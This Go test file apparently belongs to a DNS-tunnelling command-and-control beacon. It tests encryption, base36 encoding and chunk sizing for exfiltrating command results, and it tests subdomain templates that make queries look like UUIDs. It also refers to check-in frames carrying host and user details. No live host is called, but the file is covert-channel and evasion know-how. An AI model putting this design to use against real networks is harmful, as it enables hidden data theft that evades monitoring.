package main

import (
	"fmt"
	"strings"
	"testing"
)

func TestGenerateAESKey(t *testing.T) {
	key1 := generateAESKey("password123")
	key2 := generateAESKey("password123")
	key3 := generateAESKey("different")

	if string(key1) != string(key2) {
		t.Error("Same passphrase should generate same key")
	}

	if string(key1) == string(key3) {
		t.Error("Different passphrases should generate different keys")
	}

	if len(key1) != 32 {
		t.Errorf("Key length should be 32 bytes, got %d", len(key1))
	}
}

func TestBase36Encoding(t *testing.T) {
	data := []byte("Hello World")
	encoded := base36Encode(data)
	decoded, err := base36Decode(encoded)

	if err != nil {
		t.Fatalf("Failed to decode: %v", err)
	}

	if string(decoded) != string(data) {
		t.Errorf("Decoded data mismatch. Got %s, want %s", string(decoded), string(data))
	}
}

func TestEncryptDecrypt(t *testing.T) {
	key := generateAESKey("testkey")
	plaintext := "Secret Message"

	encrypted, err := encryptAndEncode(plaintext, key)
	if err != nil {
		t.Fatalf("Encryption failed: %v", err)
	}

	decrypted, err := decodeAndDecrypt(encrypted, key)
	if err != nil {
		t.Fatalf("Decryption failed: %v", err)
	}

	if decrypted != plaintext {
		t.Errorf("Decrypted text mismatch. Got %s, want %s", decrypted, plaintext)
	}
}

func TestDNSClientInit(t *testing.T) {
	client := newDNSClient()
	if client == nil {
		t.Fatal("Failed to create DNSClient")
	}

	if client.config == nil {
		t.Error("Config should not be nil")
	}
}

// calculateSafeRawChunk mirrors the logic in exfiltrateResult for testing.
// domains and payloadFormat default to nil/"" for backward-compatible calls.
func calculateSafeRawChunk(maxCommandLength, maxSubdomainLength int) int {
	return calculateSafeRawChunkFull(maxCommandLength, maxSubdomainLength, false, nil, "")
}

func calculateSafeRawChunkWithEncoding(maxCommandLength, maxSubdomainLength int, unencrypted bool) int {
	return calculateSafeRawChunkFull(maxCommandLength, maxSubdomainLength, unencrypted, nil, "")
}

func calculateSafeRawChunkFull(maxCommandLength, maxSubdomainLength int, unencrypted bool, domains []string, payloadFormat string) int {
	maxCmd := maxCommandLength
	if maxCmd <= 64 {
		maxCmd = 800
	}

	overhead := 63
	if unencrypted {
		overhead = 35
	}

	var safeRawChunk int
	if maxSubdomainLength > 0 {
		labelDots := maxSubdomainLength / 63
		encodedBudget := maxSubdomainLength - labelDots
		safeRawChunk = encodedBudget*5/8 - overhead
		if safeRawChunk < 1 {
			safeRawChunk = 1
		}
	} else {
		calcOverhead := 100
		safeRawChunk = (maxCmd - calcOverhead) / 2
		if safeRawChunk < 8 {
			safeRawChunk = 8
		}
	}

	if payloadFormat != "" {
		xSlots := countDataSlots(payloadFormat)
		formatChunk := xSlots*5/8 - overhead
		if formatChunk >= 1 {
			if safeRawChunk == 0 || formatChunk < safeRawChunk {
				safeRawChunk = formatChunk
			}
		}
	}

	maxDomainLen := 0
	for _, d := range domains {
		if len(d) > maxDomainLen {
			maxDomainLen = len(d)
		}
	}
	if maxDomainLen == 0 {
		maxDomainLen = 20
	}
	subBudget := 253 - 1 - maxDomainLen
	fqdnLabelDots := subBudget / 63
	fqdnEncoded := subBudget - fqdnLabelDots
	fqdnCap := fqdnEncoded*5/8 - overhead
	if fqdnCap < 8 {
		fqdnCap = 8
	}
	if safeRawChunk > fqdnCap {
		safeRawChunk = fqdnCap
	}

	return safeRawChunk
}

func TestSafeRawChunk_DefaultNoLimit(t *testing.T) {
	// Default: MaxSubdomainLength=0, MaxCommandLength=400, default domain=20 chars
	// (400-100)/2=150, FQDN cap: (253-1-20)=232, dots=3, encoded=229, 229*5/8-63=80
	chunk := calculateSafeRawChunk(400, 0)
	if chunk != 80 {
		t.Errorf("Default chunk should be 80 (FQDN-capped), got %d", chunk)
	}
}

func TestSafeRawChunk_SubdomainLimit50(t *testing.T) {
	// encrypted, 50-char limit: 50*5/8 - 63 = 31-63 = -32 → 1 (below viable, user accepts tiny chunks)
	chunk := calculateSafeRawChunk(400, 50)
	if chunk != 1 {
		t.Errorf("50-char encrypted subdomain limit should give chunk=1, got %d", chunk)
	}
}

func TestSafeRawChunk_SubdomainLimit100(t *testing.T) {
	// encrypted, 100-char limit: 100*5/8 - 63 = 62-63 = -1 → 1
	chunk := calculateSafeRawChunk(400, 100)
	if chunk != 1 {
		t.Errorf("100-char encrypted subdomain limit should give chunk=1, got %d", chunk)
	}
}

func TestSafeRawChunk_SubdomainLimit200(t *testing.T) {
	// encrypted, 200-char limit: dots=200/63=3, encoded=197, 197*5/8-63=60
	chunk := calculateSafeRawChunk(400, 200)
	if chunk != 60 {
		t.Errorf("200-char encrypted subdomain limit should give chunk=60, got %d", chunk)
	}
}

func TestSafeRawChunk_VerySmallLimit(t *testing.T) {
	// encrypted, 10-char limit: 10*5/8 - 63 = 6-63 = -57 → 1 (no 8-floor when limit is explicit)
	chunk := calculateSafeRawChunk(400, 10)
	if chunk != 1 {
		t.Errorf("Very small subdomain limit should give chunk=1, got %d", chunk)
	}
}

func TestSafeRawChunk_LargeLimit(t *testing.T) {
	// encrypted, 500-char limit: dots=7, encoded=493, 493*5/8-63=245, FQDN cap=80
	chunk := calculateSafeRawChunk(400, 500)
	if chunk != 80 {
		t.Errorf("Large subdomain limit should be FQDN-capped at 80, got %d", chunk)
	}
}

func TestSafeRawChunk_FQDNCapWithExplicitDomains(t *testing.T) {
	// Short domain (10 chars): subBudget=242, dots=3, encoded=239, cap=239*5/8-63=86
	chunk10 := calculateSafeRawChunkFull(400, 0, false, []string{"short.test"}, "")
	// Long domain (50 chars): subBudget=202, dots=3, encoded=199, cap=199*5/8-63=61
	longDomain := "this-is-a-very-long-domain-name.for-testing.example"
	chunk50 := calculateSafeRawChunkFull(400, 0, false, []string{longDomain}, "")

	if chunk10 <= chunk50 {
		t.Errorf("Shorter domain should allow larger chunks: short=%d, long=%d", chunk10, chunk50)
	}
	if chunk10 != 86 {
		t.Errorf("10-char domain FQDN cap should be 86, got %d", chunk10)
	}
}

func TestSafeRawChunk_PayloadFormatConstraint(t *testing.T) {
	// 150 X-slot format: formatChunk = 150*5/8-63 = 93-63 = 30
	// FQDN cap with default domain: 80
	// min(150, 30) = 30 (format is tighter)
	format := buildTestFormat(150)
	chunk := calculateSafeRawChunkFull(400, 0, false, nil, format)
	if chunk != 30 {
		t.Errorf("150-slot format should constrain chunk to 30, got %d", chunk)
	}
}

func TestSafeRawChunk_ChunkCountIncreasesWithSmallerLimit(t *testing.T) {
	// Use unencrypted mode where the subdomain budget has a meaningful range.
	// Encrypted: formula gives 1 for any limit < 104 (all the same, no useful comparison).
	// Unencrypted (overhead=35): 200-char → 90 bytes; 100-char → 27 bytes; 60-char → 2 bytes.
	result := strings.Repeat("x", 300) // long enough to require multiple chunks at all limits

	chunkDefault := calculateSafeRawChunkWithEncoding(400, 0, true)
	chunk200 := calculateSafeRawChunkWithEncoding(400, 200, true)
	chunk100 := calculateSafeRawChunkWithEncoding(400, 100, true)
	chunk60 := calculateSafeRawChunkWithEncoding(400, 60, true)

	chunksDefault := (len(result) + chunkDefault - 1) / chunkDefault
	chunks200 := (len(result) + chunk200 - 1) / chunk200
	chunks100 := (len(result) + chunk100 - 1) / chunk100
	chunks60 := (len(result) + chunk60 - 1) / chunk60

	if chunks200 <= chunksDefault {
		t.Errorf("200-char limit should need more chunks than default: %d vs %d", chunks200, chunksDefault)
	}
	if chunks100 <= chunks200 {
		t.Errorf("100-char limit should need more chunks than 200-char: %d vs %d", chunks100, chunks200)
	}
	if chunks60 <= chunks100 {
		t.Errorf("60-char limit should need more chunks than 100-char: %d vs %d", chunks60, chunks100)
	}

	t.Logf("Result length: %d bytes", len(result))
	t.Logf("Unencrypted, default: chunk=%d, queries=%d", chunkDefault, chunksDefault)
	t.Logf("Unencrypted, 200-char: chunk=%d, queries=%d", chunk200, chunks200)
	t.Logf("Unencrypted, 100-char: chunk=%d, queries=%d", chunk100, chunks100)
	t.Logf("Unencrypted,  60-char: chunk=%d, queries=%d", chunk60, chunks60)
}

func encodeSubdomain(data string, key []byte, unencrypted bool) (string, error) {
	var encoded string
	var err error
	if unencrypted {
		encoded = base36EncodeString(data)
	} else {
		encoded, err = encryptAndEncode(data, key)
		if err != nil {
			return "", err
		}
	}
	// Split into 62-char labels
	var labels []string
	rem := encoded
	for len(rem) > 0 {
		n := 62
		if n > len(rem) {
			n = len(rem)
		}
		labels = append(labels, rem[:n])
		rem = rem[n:]
	}
	return strings.Join(labels, "."), nil
}

func TestSafeRawChunk_EncodedFitsSubdomain(t *testing.T) {
	// Verify the chunk calculated by the formula actually produces a subdomain
	// that FITS WITHIN maxSubdomainLength (the core invariant the formula must hold).
	key := generateAESKey("testkey")

	// Frame overhead prefix added by the beacon around the raw chunk data.
	// DATA|{8-bid}|T0001|{idx}|{total}|{chunk}|{5-ts} = ~35 chars of overhead
	framePrefix := "DATA|a1b2c3d4|T0001|1|10|"
	frameSuffix := "|22000"

	tests := []struct {
		name         string
		maxSubdomain int
		unencrypted  bool
	}{
		// Encrypted: needs ≥ 104 char subdomain budget to carry 1+ bytes
		{"enc/120", 120, false},
		{"enc/150", 150, false},
		{"enc/200", 200, false},
		// Unencrypted: 35-byte overhead → viable from ~42 chars
		{"plain/60", 60, true},
		{"plain/80", 80, true},
		{"plain/100", 100, true},
		{"plain/150", 150, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			chunkSize := calculateSafeRawChunkWithEncoding(400, tt.maxSubdomain, tt.unencrypted)
			chunk := strings.Repeat("x", chunkSize)
			payload := framePrefix + chunk + frameSuffix

			subdomain, err := encodeSubdomain(payload, key, tt.unencrypted)
			if err != nil {
				t.Fatalf("encode failed: %v", err)
			}

			t.Logf("chunk=%d bytes, payload=%d chars, subdomain=%d chars (limit=%d)",
				chunkSize, len(payload), len(subdomain), tt.maxSubdomain)

			if len(subdomain) > tt.maxSubdomain {
				t.Errorf("subdomain=%d chars exceeds maxSubdomainLength=%d", len(subdomain), tt.maxSubdomain)
			}
			if len(subdomain)+1+16 > 253 { // +1+domain(16)
				t.Errorf("FQDN would exceed 253")
			}
		})
	}
}

func TestCountDataSlots(t *testing.T) {
	tests := []struct {
		format   string
		expected int
	}{
		{"XXXX", 4},
		{"XXXX-XXXX", 8},
		{"XXXX-XXXX.XXXX-XXXX", 16},
		{"XX.XX.XX", 6},
		{"hello", 0},
		{"", 0},
		{"X", 1},
		{"X-X-X-X-X", 5},
		{"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 32},
	}

	for _, tt := range tests {
		t.Run(tt.format, func(t *testing.T) {
			got := countDataSlots(tt.format)
			if got != tt.expected {
				t.Errorf("countDataSlots(%q) = %d, want %d", tt.format, got, tt.expected)
			}
		})
	}
}

func TestFormatPayloadWithTemplate(t *testing.T) {
	// Basic: fill X positions, keep decorators
	result, err := formatPayloadWithTemplate("abcdefgh", "XXXX-XXXX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "abcd-efgh" {
		t.Errorf("got %q, want %q", result, "abcd-efgh")
	}
}

func TestFormatPayloadWithTemplate_Dots(t *testing.T) {
	// Dots become DNS label separators
	result, err := formatPayloadWithTemplate("abcdefghijklmnop", "XXXX-XXXX.XXXX-XXXX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "abcd-efgh.ijkl-mnop" {
		t.Errorf("got %q, want %q", result, "abcd-efgh.ijkl-mnop")
	}
}

func TestFormatPayloadWithTemplate_ExceedsCapacity(t *testing.T) {
	// Data longer than X count should return error
	_, err := formatPayloadWithTemplate("abcdefghij", "XXXX-XXXX") // 10 data, 8 slots
	if err == nil {
		t.Error("expected error for data exceeding template capacity")
	}
}

func TestFormatPayloadWithTemplate_ShortData_NoTrailingGarbage(t *testing.T) {
	// Data shorter than X count: fill what we have, include decorators between filled
	// X-slots, then stop — no padding, no trailing chars from the template.
	result, err := formatPayloadWithTemplate("abc", "XXXX-XXXX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// "abc" fills 3 X-slots: "abc". After 'c' the data is exhausted; the '-' after
	// the 4th X is not reached, so result is just "abc".
	if result != "abc" {
		t.Errorf("got %q, want %q", result, "abc")
	}

	// With a decorator between the last two data chars
	result2, err := formatPayloadWithTemplate("abcd", "XX-XX-XX")
	if err != nil {
		t.Fatalf("unexpected error 2: %v", err)
	}
	// "abcd" fills 4 X-slots: 'a','b',then '-','c','d', then data exhausted before next '-'
	if result2 != "ab-cd" {
		t.Errorf("got %q, want %q", result2, "ab-cd")
	}
}

func TestFormatPayloadWithTemplate_EmptyData(t *testing.T) {
	// Empty data: no X-slots can be filled, result is empty
	result, err := formatPayloadWithTemplate("", "XX-XX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "" {
		t.Errorf("empty data should produce empty result, got %q", result)
	}
}

func TestFormatPayloadWithTemplate_NoDecorators(t *testing.T) {
	// Pure X format = just data, no decorators
	result, err := formatPayloadWithTemplate("abcdef", "XXXXXX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "abcdef" {
		t.Errorf("got %q, want %q", result, "abcdef")
	}
}

func TestFormatPayloadWithTemplate_ComplexFormat(t *testing.T) {
	// UUID-like format
	result, err := formatPayloadWithTemplate("abcdefghijklmnopqrstuvwxyz123456", "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	expected := "abcdefgh-ijkl-mnop-qrst-uvwxyz123456"
	if result != expected {
		t.Errorf("got %q, want %q", result, expected)
	}
}

func TestSafeRawChunk_WithPayloadFormat(t *testing.T) {
	// A 32-slot format is too small to carry data (formatChunk = 32*5/8-63 = -43).
	// The exfiltrateResult code skips the format-based constraint when formatChunk < 1,
	// so safeRawChunk is unaffected and sendDNSQueryWithDepth will fall back to default
	// label encoding for DATA queries.
	format32 := "XXXX-XXXX.XXXX-XXXX.XXXX-XXXX.XXXX-XXXX"
	xSlots := countDataSlots(format32)
	if xSlots != 32 {
		t.Fatalf("expected 32 X slots, got %d", xSlots)
	}
	formatChunk := xSlots*5/8 - 63
	if formatChunk >= 1 {
		t.Errorf("32-slot format should give formatChunk < 1 (CHK-only mode), got %d", formatChunk)
	}
}

func TestCheckInMessageFitsInDNS(t *testing.T) {
	// A CHK with build ID (6 chars) should comfortably fit in DNS limits.
	// Encrypted+base36 expansion is roughly plaintext * 1.6 + overhead.
	chk := "CHK|a1b2|myhost1234|username|linux12|amd64x|k7m2x9"
	// 28 (AES-GCM) + len(chk) + 11 (timestamp) = ~94 bytes plaintext
	// ~94 * 1.6 = ~150 chars encoded, well under 253 - domain
	if len(chk) > 120 {
		t.Errorf("CHK message too long for DNS: %d chars", len(chk))
	}
}

// --- Encryption toggle (Encoding field) ---

func TestBase36EncodeDecodeRoundTrip(t *testing.T) {
	msg := "CHK|a1b2|myhost|user|linux|amd64|00000"
	encoded := base36EncodeString(msg)
	if encoded == "" {
		t.Fatal("base36EncodeString returned empty string")
	}
	decoded, err := base36DecodeString(encoded)
	if err != nil {
		t.Fatalf("base36DecodeString failed: %v", err)
	}
	if decoded != msg {
		t.Errorf("round-trip failed: got %q, want %q", decoded, msg)
	}
}

func TestBase36EncodingIsDifferentFromAES(t *testing.T) {
	// Plain base36 should produce a different (shorter) encoding than AES-GCM+base36
	key := generateAESKey("testkey")
	msg := "CHK|a1b2|host|user|linux|amd64|00000"

	plainEncoded := base36EncodeString(msg)
	aesEncoded, err := encryptAndEncode(msg, key)
	if err != nil {
		t.Fatalf("encryptAndEncode: %v", err)
	}

	if plainEncoded == aesEncoded {
		t.Error("plain base36 and AES-GCM+base36 should produce different output")
	}
	if len(plainEncoded) >= len(aesEncoded) {
		t.Errorf("plain base36 (%d chars) should be shorter than AES output (%d chars)",
			len(plainEncoded), len(aesEncoded))
	}
}

func TestTimestampIsFiveDigits(t *testing.T) {
	// The 5-digit truncated timestamp should always be exactly 5 chars
	for i := 0; i < 10; i++ {
		ts := fmt.Sprintf("%05d", (1742000000+int64(i*12345))%100000)
		if len(ts) != 5 {
			t.Errorf("timestamp %q is %d chars, want 5", ts, len(ts))
		}
		for _, c := range ts {
			if c < '0' || c > '9' {
				t.Errorf("timestamp %q contains non-digit %c", ts, c)
			}
		}
	}
}

// --- PayloadFormat formula correctness ---

func TestFormatChunk_Formula_SmallFormats(t *testing.T) {
	// Formats with fewer than 114 X slots cannot carry even an 8-byte chunk.
	// Formula: xSlots*5/8 - 63. Expect negative or zero for small formats.
	cases := []struct {
		xSlots   int
		expectGT int // expected to be ≤ this (shows formula is conservative)
	}{
		{32, 0},  // 32*5/8-63 = 20-63 = -43 — too small
		{64, 0},  // 64*5/8-63 = 40-63 = -23 — too small
		{100, 0}, // 100*5/8-63 = 62-63 = -1  — too small
	}
	for _, tc := range cases {
		got := tc.xSlots*5/8 - 63
		if got > tc.expectGT {
			t.Errorf("xSlots=%d: expected formatChunk ≤ %d, got %d", tc.xSlots, tc.expectGT, got)
		}
	}
}

func TestFormatChunk_Formula_UsableFormats(t *testing.T) {
	// Formats with enough X slots should give a positive, meaningful chunk size.
	// Minimum viable: xSlots=114 → 114*5/8-63 = 71-63 = 8 bytes (min chunk size).
	cases := []struct {
		xSlots  int
		wantMin int
		wantMax int
	}{
		{114, 8, 20},   // just enough for minimum chunk
		{150, 20, 40},  // 150*5/8-63 = 93-63 = 30
		{200, 50, 70},  // 200*5/8-63 = 125-63 = 62
		{250, 80, 100}, // 250*5/8-63 = 156-63 = 93
	}
	for _, tc := range cases {
		got := tc.xSlots*5/8 - 63
		if got < tc.wantMin || got > tc.wantMax {
			t.Errorf("xSlots=%d: formatChunk=%d, want [%d, %d]", tc.xSlots, got, tc.wantMin, tc.wantMax)
		}
	}
}

func TestFormatChunk_FqdnCapConsistency(t *testing.T) {
	// With a format whose X slot count equals the available subdomain chars for a domain,
	// formatChunk and fqdnCap should agree (both derived from the same overhead formula).
	// Note: FQDN cap accounts for label dots in the subdomain budget.
	domainLen := 20
	subBudget := 253 - domainLen - 1 // 232
	fqdnLabelDots := subBudget / 63
	fqdnEncoded := subBudget - fqdnLabelDots

	fqdnCap := fqdnEncoded*5/8 - 63
	formatChunk := fqdnEncoded*5/8 - 63 // same slot count = same result

	if fqdnCap != formatChunk {
		t.Errorf("fqdnCap (%d) and formatChunk (%d) should be equal when xSlots == fqdnEncoded", fqdnCap, formatChunk)
	}
	if fqdnCap <= 0 {
		t.Errorf("expected positive chunk size for domain len %d, got %d", domainLen, fqdnCap)
	}
}

// TestFormatPayloadWithTemplate_RoundTrip verifies that a chunk calculated by the fixed formula
// actually fits in the template without overflowing the X-slot count.
// This is the key regression test: the old formula caused overflow here.
func TestFormatPayloadWithTemplate_RoundTrip(t *testing.T) {
	key := generateAESKey("testkey123")

	cases := []struct {
		format  string
		xSlots  int
	}{
		// Use buildTestFormat which produces RFC 1035-compliant labels (≤63 chars each)
		{buildTestFormat(120), 120},
		{buildTestFormat(150), 150},
		{buildTestFormat(200), 200},
		{buildTestFormat(128), 128},
		{buildTestFormat(160), 160},
	}

	for _, tc := range cases {
		xSlots := countDataSlots(tc.format)
		if xSlots != tc.xSlots {
			t.Fatalf("format setup error: got %d X slots, want %d", xSlots, tc.xSlots)
		}

		// Compute the chunk size the fixed formula would pick
		formatChunk := xSlots*5/8 - 63
		if formatChunk < 1 {
			formatChunk = 1
		}
		if formatChunk < 8 {
			formatChunk = 8
		}

		// Build a realistic DATA frame with that chunk size
		chunk := strings.Repeat("a", formatChunk)
		plaintext := "DATA|a1b2c3d4|T0001|1|1|" + chunk + "|1742000000"

		// Encrypt + base36 encode (mirrors encodeCommand internals)
		encrypted, err := encryptAESGCM([]byte(plaintext), key)
		if err != nil {
			t.Fatalf("encrypt failed: %v", err)
		}
		encoded := base36Encode(encrypted)

		// The encoded result must fit in the template's X slots
		if len(encoded) > xSlots {
			t.Errorf("xSlots=%d, formatChunk=%d: encoded length %d exceeds X slot count %d (overflow!)",
				xSlots, formatChunk, len(encoded), xSlots)
			continue
		}

		// Must also successfully format without error
		_, err = formatPayloadWithTemplate(encoded, tc.format)
		if err != nil {
			t.Errorf("xSlots=%d, formatChunk=%d: formatPayloadWithTemplate failed: %v", xSlots, formatChunk, err)
		}
	}
}

// TestFormatPayloadWithTemplate_FallbackOnOverflow verifies that a short format (CHK-only)
// doesn't cause an error when encoded data exceeds the X-slot count — the caller is
// expected to detect the error and fall back to default label encoding.
func TestFormatPayloadWithTemplate_FallbackOnOverflow(t *testing.T) {
	key := generateAESKey("testkey")
	shortFormat := "XXXXXXXXXX-XXXXX.XXXXX" // 22 chars, 20 X slots — way too small for data

	// Encode a realistic CHK message — small enough to fit
	chk := "CHK|a1b2|host|user|linux|amd64"
	encrypted, err := encryptAESGCM([]byte(chk), key)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	encoded := base36Encode(encrypted)

	if len(encoded) <= countDataSlots(shortFormat) {
		// CHK happened to fit — fine, no fallback needed here
		if _, err := formatPayloadWithTemplate(encoded, shortFormat); err != nil {
			t.Errorf("CHK that fits should not error: %v", err)
		}
		return
	}

	// Encoded data exceeds X slots: formatPayloadWithTemplate must return an error
	// so the caller knows to fall back to default encoding.
	_, err = formatPayloadWithTemplate(encoded, shortFormat)
	if err == nil {
		t.Error("expected error when encoded data exceeds X-slot count so caller can fall back")
	}
}

// buildTestFormat creates a format string with exactly n X slots using decorated groups.
// Uses "XXXXXXXX-" groups (8 X per group) joined by dots.
func buildTestFormat(xSlots int) string {
	const groupSize = 8
	groups := xSlots / groupSize
	rem := xSlots % groupSize

	var parts []string
	for i := 0; i < groups; i++ {
		parts = append(parts, strings.Repeat("X", groupSize)+"-end")
	}
	if rem > 0 {
		parts = append(parts, strings.Repeat("X", rem)+"-end")
	}
	return strings.Join(parts, ".")
}
